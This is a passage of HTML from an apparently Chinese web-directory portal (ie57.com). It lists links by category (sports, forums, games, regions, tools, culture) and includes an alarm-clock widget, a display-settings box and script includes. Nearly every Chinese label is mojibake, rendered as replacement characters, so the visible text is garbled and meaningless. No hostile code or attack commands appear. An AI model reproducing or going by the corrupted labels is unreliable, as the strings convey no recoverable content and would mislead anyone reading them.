                                        <dd><a href="http://www.xingkong.com/">�ǿ���</a></dd>
                                        <dd><a href="http://stbnnr.allyes.com/bnnr/114la_baishehui.html">�����</a></dd>
                                    </dl>
                            <dl><dt><a href="html/bizhi/" >ͼƬ</a></dt>
                                        <dd><a href="http://star.1ting.com/">��ŮͼƬ</a></dd>
                                        <dd><a href="http://ent.huanqiu.com/pic/">����д��</a></dd>
                                        <dd><a href="http://www.sc-cn.net">�ز��й�</a></dd>
                                        <dd><a href="http://www.zcool.com.cn/">վ���ز�</a></dd>
                                        <dd><a href="http://sc.chinaz.com/">վ���ز�</a></dd>
                                        <dd><a href="http://www.27.cn/jptk/index.html">�Ը���Ů</a></dd>
                                    </dl>
                            <dl class="alt"><dt><a href="html/tiyu/" >����</a></dt>
                                        <dd><a href="http://china.nba.com/">NBA������</a></dd>
                                        <dd><a href="http://sports.sohu.com/">�Ѻ�����</a></dd>
                                        <dd><a href="http://sports.cn.yahoo.com/index.html?f=E114_3_1">�Ż�����</a></dd>
                                        <dd><a href="http://sports.163.com/">��������</a></dd>
                                        <dd><a href="http://sports.qq.com/">��Ѷ����</a></dd>
                                        <dd><a href="http://sports.tom.com/">������̳</a></dd>
                                        <dd><a href="http://sports.sina.com.cn/">��������</a></dd>
                                    </dl>
                            <dl><dt><a href="html/bbs/" >��̳</a></dt>
                                        <dd><a href="http://tieba.baidu.com/">�ٶ�����</a></dd>
                                        <dd><a href="http://www.tianya.cn/">��������</a></dd>
                                        <dd><a href="http://bbs.ifeng.com">�����̳</a></dd>
                                        <dd><a href="http://q.sohu.com/">�Ѻ�Ȧ��</a></dd>
                                        <dd><a href="http://club.163.com/">��������</a></dd>
                                        <dd><a href="http://bbs.ik123.com/">������̳</a></dd>
                                    </dl>
                        </div>
            <!--/ list-->
        </div><!--/ coolsite-->
    </div><!--/ main-->
    <div id="cate" class="bd">
                        <h2>��������</h2>
        <ul>
                        <li ><a href="http://www.ie57.com/html/music/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/vedio/index.htm">��Ƶ</a></li>
                        <li ><a href="http://www.ie57.com/html/games/index.htm">��Ϸ</a></li>
                        <li ><a href="http://www.ie57.com/html/news/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/movie/index.htm">��Ӱ</a></li>
                        <li ><a href="http://www.ie57.com/html/xiaoshuo/index.htm">С˵</a></li>
                        <li ><a href="http://www.ie57.com/html/tiyu/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/football/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/nba/index.htm">NBA</a></li>
                        <li ><a href="http://www.ie57.com/html/bizhi/index.htm">��ͼ</a></li>
                        <li ><a href="http://www.ie57.com/html/xingzuo/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/dongman/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/fun/index.htm">Ц��</a></li>
                        <li ><a href="http://www.ie57.com/html/bbs/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/love/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/star/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/sheying/index.htm">��Ӱ</a></li>
                        <li ><a href="http://www.ie57.com/html/junshi/index.htm">����</a></li>
                        <li ><a href="/html/catalog/game.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/xiaoyouxi/index.htm">С��Ϸ</a></li>
                    </ul>
                <h2>�������</h2>
        <ul>
                        <li ><a href="http://tool.115.com/tianqi/">����</a></li>
                        <li ><a href="http://tool.114la.com/">��ѯ</a></li>
                        <li ><a href="http://www.ie57.com/html/gupiao/index.htm">��Ʊ</a></li>
                        <li ><a href="http://www.ie57.com/html/jijin/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/gouwu/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/bank/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/car/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/house/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/caipiao/index.htm">��Ʊ</a></li>
                        <li ><a href="http://www.ie57.com/html/shouji/index.htm">�ֻ�</a></li>
                        <li ><a href="http://www.ie57.com/html/health/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/law/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/qinzi/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/lady/index.htm">Ů��</a></li>
                        <li ><a href="http://www.ie57.com/html/sex/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/pet/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/travel/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/fashion/index.htm">ʱ��</a></li>
                        <li ><a href="http://www.ie57.com/html/foods/index.htm">��ʳ</a></li>
                        <li ><a href="http://www.ie57.com/html/tongxin/index.htm">ͨ��</a></li>
                        <li ><a href="http://www.ie57.com/html/rencai/index.htm">��Ƹ</a></li>
                        <li ><a href="http://www.ie57.com/html/life/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/yule/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/map/index.htm">��ͼ</a></li>
                    </ul>
                <h2>��������</h2>
        <ul>
                        <li ><a href="http://www.ie57.com/html/it/index.htm">IT</a></li>
                        <li ><a href="http://www.ie57.com/html/mail/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/soft/index.htm">���</a></li>
                        <li ><a href="http://www.ie57.com/html/computer/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/Heike_Anquan/index.htm">�ڿ�</a></li>
                        <li ><a href="http://www.ie57.com/html/BT/index.htm">BT</a></li>
                        <li ><a href="http://www.ie57.com/html/desktop/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/blog/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/liaotian_qq/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/Yingjian_Zixun/index.htm">Ӳ��</a></li>
                        <li ><a href="http://www.ie57.com/html/shuma_shishang/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/Sousuo_Yinqing/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/design/index.htm">���</a></li>
                        <li ><a href="http://www.ie57.com/html/Chengxu_Biancheng/index.htm">���</a></li>
                        <li ><a href="http://www.ie57.com/html/Jianzhan_Sheji/index.htm">��վ</a></li>
                        <li ><a href="http://www.ie57.com/html/flash-show/index.htm">Flash</a></li>
                        <li ><a href="http://qq.114la.com/">������</a></li>
                    </ul>
                <h2>�Ļ�����</h2>
        <ul>
                        <li ><a href="http://www.ie57.com/html/jiaoyu/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/kexue_jishu/index.htm">�Ƽ�</a></li>
                        <li ><a href="http://www.ie57.com/html/waiyu_xuexi/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/kaoshi/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/gaokao/index.htm">�߿�</a></li>
                        <li ><a href="http://www.ie57.com/html/kaoyan/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/xiaoyuan_gaoxiao/index.htm">��ѧ</a></li>
                        <li ><a href="http://www.ie57.com/html/kejian_lunwen/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/xiaoyuan/index.htm">У԰</a></li>
                        <li ><a href="http://www.ie57.com/html/quyi/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/shehui_wenhua/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/chuguo_liuxue/index.htm">��ѧ</a></li>
                        <li ><a href="http://www.ie57.com/html/yishu_aihao/index.htm">����</a></li>
                        <li ><a href="http://www.ie57.com/html/zongjiao/index.htm">�ڽ�</a></li>
                        <li ><a href="http://www.ie57.com/html/gongyi/index.htm">����</a></li>
                    </ul>
                <h2>�������</h2>
        <ul class="c2">
                        <li ><a href="http://www.ie57.com/html/zhaoshang/index.htm">���̼���</a></li>
                        <li ><a href="html/local/index.htm">�ط�����</a></li>
                        <li ><a href="http://www.ie57.com/html/zhengfu/index.htm">��������</a></li>
                        <li ><a href="html/trade_sites.htm">��ҵ��վ</a></li>
                        <li ><a href="http://www.ie57.com/html/guowai/index.htm">������վ</a></li>
                        <li ><a href="http://www.ie57.com/html/dianshi/index.htm">���ӵ�̨</a></li>
                        <li ><a href="http://www.ie57.com/html/wap/index.htm">Wap��ַ</a></li>
                        <li ><a href="http://www.ie57.com/html/shadu/index.htm">ɱ������</a></li>
                        <li ><a href="http://www.ie57.com/html/free/index.htm">�����Դ</a></li>
                        <li ><a href="http://www.ie57.com/html/lipin/index.htm">�ʻ���Ʒ</a></li>
                        <li ><a href="http://www.ie57.com/html/cool/index.htm">��Ȥ��վ</a></li>
                        <li ><a href="http://www.ie57.com/html/webtool/index.htm">վ������</a></li>
                    </ul>
                    
    </div><!--/ cate-->
</div><!--/ content-->
<div id="location">
    <ul>
                        <li class="bd">
            <strong>������Ϸ</strong>
                        <a href="http://www.ie57.com/html/catalog/game.htm#11">ħ������</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#39">�����˲�</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#78">���³�����ʿ</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#15">�λ�����</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#42">�����ɡ�</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#83">�����⴫</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#27">���ʵ���</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#81">��Խ����</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#20">��Ѫ����</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#18">������</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#16">���ܿ�����</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#101">Aion����֮��</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#25">���־�ӢCS</a>
                        <a href="http://www.ie57.com/html/catalog/game.htm#14">��ͷ����</a>
                        <span class="more"><a href="http://www.ie57.com/html/catalog/game.htm">����...</a></span>
        </li>
                <li class="bd">
            <strong>������Ϸ</strong>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#26">ħ������</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#22">��ɫ����</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#49">�����ƻ���II</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#54">�۹�ʱ��</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#52">���� FIFA</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#48">��Ʒ�ɳ�</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#50">�����ɳ�</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#47">PSP�ƻ�</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#41">������</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#53">��������</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#51">����/������</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#46">������Ϸ</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#45">��ױ��Ϸ</a>
                        <a href="http://www.ie57.com/html/catalog/game1.htm#44">����С��Ϸ</a>
                        <span class="more"><a href="http://www.ie57.com/html/catalog/game1.htm">����...</a></span>
        </li>
                <li class="bd">
<strong>�ط�����</strong> 
<a  href="http://www.ie57.com/html/local/beijing.htm" title="����">����</a>
<a  href="http://www.ie57.com/html/local/tianjin.htm" title="���">���</a>
<a  href="http://www.ie57.com/html/local/hebei.htm" title="�ӱ�">�ӱ�</a>
<a  href="http://www.ie57.com/html/local/shanxi.htm" title="ɽ��">ɽ��</a>
<a  href="http://www.ie57.com/html/local/neimenggu.htm" title="���ɹ�">���ɹ�</a>
<a  href="http://www.ie57.com/html/local/liaoning.htm" title="����">����</a>
<a  href="http://www.ie57.com/html/local/jilin.htm" title="����">����</a>
<a  href="http://www.ie57.com/html/local/heilongjiang.htm" title="������">������</a>
<a  href="http://www.ie57.com/html/local/shanghai.htm" title="�Ϻ�">�Ϻ�</a>
<a  href="http://www.ie57.com/html/local/jiangsu.htm" title="����">����</a>
<a  href="http://www.ie57.com/html/local/zhejiang.htm" title="�㽭">�㽭</a>
<a  href="http://www.ie57.com/html/local/anhui.htm" title="����">����</a>
<a  href="http://www.ie57.com/html/local/fujian.htm" title="����">����</a>
<a  href="http://www.ie57.com/html/local/jiangxi.htm" title="����">����</a>
<a  href="http://www.ie57.com/html/local/shandong.htm" title="ɽ��">ɽ��</a>
<a  href="http://www.ie57.com/html/local/henan.htm" title="����">����</a>
<a  href="http://www.ie57.com/html/local/hubei.htm" title="����">����</a>
<a  href="http://www.ie57.com/html/local/hunan.htm" title="����">����</a>
<a  href="http://www.ie57.com/html/local/guangdong.htm" title="�㶫">�㶫</a>
<a  href="http://www.ie57.com/html/local/guangxi.htm" title="����">����</a>
<a  href="http://www.ie57.com/html/local/hainan.htm" title="����">����</a>
<a  href="http://www.ie57.com/html/local/chongqing.htm" title="����">����</a>
<a  href="http://www.ie57.com/html/local/sichuan.htm" title="�Ĵ�">�Ĵ�</a>
<a  href="http://www.ie57.com/html/local/guizhou/.htm" title="����">����</a>
<a  href="http://www.ie57.com/html/local/yunnan.htm" title="����">����</a>
<span class="more"><a href="http://www.ie57.com/html/local/">����...</a></span>
        </li>
        
    </ul>
</div><!--/ location--><div id="footer"> <a href="#" target="_blank">��������</a> | <a href="http://www.ie57.com/url-submit/" target="_blank">��վ�ύ</a> | <a href="http://www.ie57.com/feedback" target="_blank">�������</a> | <a href="#" target="_blank">����</a> 
            <div class="hr"></div>
            <p> ����֮��www.ie57.com &copy;2005-2010 . ��ICP��09157283��
        </div>
        <!--/ footer-->
        <div style="display: none;" class="bd" id="weatherBox">
            <div class="head"><a title="�ر�" id="closeWTBOX" class="close">�ر�</a><span style="float:left;">#{postTime}</span></div>
            <h2>#{city} #{more}</h2>
            #{weather} </div>
        <div id="setting-box" class="bd" style="display:none">
            <h2 id="setting2">��������</h2>
            <ul>
                <li id="layout-setting"> <strong>��Ļ���ã�</strong> <a rel="0" class="a">�����</a> <a rel="1" class="b">��׼��</a> <a rel="2" class="c">������</a> </li>
                <li id="style-setting" class="theme"> <strong>������ã�</strong> <a rel="0" class="blue">0</a> <a rel="1" class="orange">1</a> <a rel="2" class="green">2</a> <a rel="3" class="purple">3</a> <a rel="4" class="blue2">4</a> </li>
                <li id="font-setting"> <strong>������ɫ��</strong> <a rel="default" class="default">��</a> <a rel="gray" class="gray">��</a> <a rel="black" class="black">��</a> <a rel="green" class="green">��</a> <a rel="pink" class="pink">�ۺ�</a> <a rel="red" class="red">��ɫ</a> </li>
                <li id="bg-setting"> <strong>����ͼƬ��</strong>
                    <div id="bg-item" class="con"> <a rel="default" class="default">��</a> <a rel="1.gif">1</a> <a rel="2.gif">2</a> <a rel="3.gif">3</a> <a rel="4.gif">4</a> <a rel="5.jpg">5</a> <a rel="6.jpg">6</a> <a rel="7.gif">6</a> </div>
                </li>
            </ul>
            <div class="center">
                <button id="setting-reset" onclick="Skinselector.Reset()" class="button">�ָ�Ĭ��</button>
                &nbsp;&nbsp;
                <button id="setting-close" class="button">�� ��</button>
            </div>
        </div>
        <!--/ settingBox-->
        
        <!-- clock start -->
        <div id="clockBox" class="bd alertbox" style="display:none;">
            <h2 id="closeClock">����</h2>
            <div class="conBox">
                <div class="cloBox">
                    <div class="todays bd"></div>
                    <div class="tools" style="display:block;">
                        <table width="100%" border="0" cellspacing="0" cellpadding="0">
                            <tr>
                                <th width="28%">����ʱ�䣺</th>
                                <td width="72%"><select id="selectHour">
                                        23
                                    </select>
                                    ʱ
                                    <select id="selectMinute">
                                        60
                                    </select>
                                    �� </td>
                            </tr>
                            <tr>
                                <th>����������</th>
                                <td><label>
                                        <select id="selectMusic" name="selectMusic">
                                            <option value='static/media/clock/1.mid'>���糱ˮ</option>
                                            <option value='static/media/clock/2.mid'>��������ҹ</option>
                                            <option value='static/media/clock/3.mid'>��Ȫӳ��</option>
                                            <option value='static/media/clock/4.mid'>�ؼ�</option>
                                            <option value='static/media/clock/5.mid'>��ũ</option>
                                            <option value='static/media/clock/6.mid'>��ף</option>
                                            <option value='static/media/clock/7.mid'>�����</option>
                                            <option value='static/media/clock/8.mid'>����</option>
                                            <option value='static/media/clock/9.mid'>������</option>
                                            <option value='static/media/clock/10.mid'>�𴲺�</option>
                                            <option value='static/media/clock/11.mid'>ǧ��֮��</option>
                                            <option value='static/media/clock/12.mid'>�Ϻ�̲</option>
                                            <option value='static/media/clock/13.mid'>ˮ�ߵİ�������</option>
                                            <option value='static/media/clock/14.mid'>������</option>
                                            <option value='static/media/clock/15.mid'>������</option>
                                            <option value='static/media/clock/16.mid'>�����������</option>
                                            <option value='static/media/clock/17.mid'>��ֻ�ں���</option>
                                            <option value='static/media/clock/18.mid'>������Ը</option>
                                            <option value='static/media/clock/19.mid'>�°���˿</option>
                                            <option value='static/media/clock/20.mid'>��˽䱳ϱ��</option>
                                            <option value='static/media/clock/21.mid'>����������</option>
                                        </select>
                                        &nbsp;
                                        <button id='alarm_music_button' style="height:22px; padding:0;">����</button>
                                    </label></td>
                                <BGSOUND id='alarm_player' src='' autostart=true  loop=2>
                            </tr>
                            <tr>
                                <th>��ʾ���֣�</th>
                                <td><input id="alarm_textarea" maxlength=40 value="��Ϣ����Ϣһ�°ɣ�"></td>
                            </tr>
                            <tr>
                                <th>�ظ����ѣ�
                                    </td>
                                <td><div id="is_single">
                                        <label for="noRepeat" style="cursor:pointer">
                                            <input type="radio" id="noRepeat" name="alarm_is_single" checked value="1" />
                                            ���ظ�</label>
                                        <label for="repeatDaily" style="cursor:pointer">
                                            <input type="radio" name="alarm_is_single" id="repeatDaily" value="0" />
                                            ÿ������</label>
                                    </div></td>
                            </tr>
                            <tr>
                                <td colspan="2"><a id="confirmed" onclick="Ylclock.set()" href="javascript:void(0)" target="_parent">�������</a> <a id="cancelBtn" href="javascript:void(0)" target="_parent">�ر�</a></td>
                            </tr>
                        </table>
                        <ul class="listC">
                        </ul>
                    </div>
                    <div class="point bd">
                        <h3><strong>ie57С������ܰ��ʾ��</strong></h3>
                        <p>����ر�ie57��ַ������ҳ�����ӹ��ܽ�ʧЧ��</p>
                        <p>����Ҫ�����������������Ա�������ʾ������</p>
                    </div>
                </div>
            </div>
        </div>
        <!-- clock end -->
        
        
    </div>
    <!--/ wrap-->
</div>
<!--/ home-->
<script type="text/javascript" src="themes/default/js/home.js"></script>
<div style="display:none"><script language="JavaScript" type="text/javascript" src="/js/tj.js"></script></div>
</body>
</html>